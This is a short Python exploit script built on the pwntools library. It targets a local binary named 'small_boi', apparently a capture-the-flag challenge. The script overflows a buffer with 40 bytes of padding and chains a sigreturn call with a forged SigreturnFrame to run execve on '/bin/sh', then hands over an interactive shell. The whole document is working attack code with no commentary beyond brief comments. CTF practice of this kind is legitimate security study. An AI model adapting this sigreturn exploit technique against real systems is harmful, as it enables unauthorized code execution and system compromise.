from pwn import *

context.clear(arch ='amd64')
#context.log_level = 'debug'
target = process('./small_boi')

# location of syscall and a sigreturn and
# /bin/sh
syscall = 0x400185
sigret = p64(0x40017d)
frame = SigreturnFrame()
bin_str = 0x4001ca

# set up our sigreturn frame to call system
frame.rax = 0x3b
frame.rdi = bin_str
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = syscall

# send payload that includes our sigreturn to call system
payload = b'A' * 40
payload += sigret
payload += bytes(frame)
target.sendline(payload)
target.interactive()
